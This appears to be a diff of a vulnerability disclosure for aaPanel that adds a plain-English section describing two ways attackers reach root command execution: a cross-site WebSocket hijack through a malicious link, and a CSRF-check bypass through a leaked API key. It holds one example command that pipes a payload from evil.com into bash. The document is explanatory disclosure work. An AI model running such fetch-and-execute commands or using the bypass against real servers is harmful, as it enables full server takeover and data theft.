@@ -24,7 +24,31 @@ This is only the **10th CVE ever** assigned to aaPanel in its 6+ year history.
 
 ---
 
-## What We Found
+---
+
+## What This Means in Plain English
+
+If you run aaPanel, here's what an attacker can do to you:
+
+**Scenario 1: An admin clicks a bad link**
+1. Someone on your team clicks a link they shouldn't (email, ad, message)
+2. That page secretly opens a WebSocket connection to your aaPanel — your browser includes your login cookie automatically because you're already logged in
+3. aaPanel sees a valid session and lets the connection through — auth passes
+4. The attacker sends `curl http://evil.com/payload.sh | bash` — that command runs as **root** on your server
+5. Your server is now fully compromised: websites stolen, databases wiped, malware served to your visitors
+
+Only one click needed. One mistaken click and the attacker owns everything.
+
+**Scenario 2: An API key leaks**
+1. An API key ends up somewhere it shouldn't — in a public GitHub repo, a config backup, a developer's notes
+2. The attacker authenticates with that key and opens a WebSocket to aaPanel
+3. The CSRF check sees "this is an API-authenticated request" and **skips the check entirely** — that's a hard bypass built into the code
+4. The attacker runs commands as root immediately
+5. No admin clicks, no warnings, no logs that look unusual — just instant compromise
+
+This is the bigger problem. The CSRF protection doesn't apply to API-authenticated requests at all. It was designed to check browser-based connections, but the code path for API access bypasses it completely.
+
+**Either way, 3.6 million servers are affected. Every version since 2021.**
 
 1. **All 10 WebSocket endpoints accept connections before verifying who you are** — returns HTTP 101 Switching Protocols before checking authentication
 2. **The CSRF check has hard bypass conditions** — `g.api_request=True` (API-authenticated requests) and `g.is_aes=True` (AES-encrypted requests) skip the check entirely
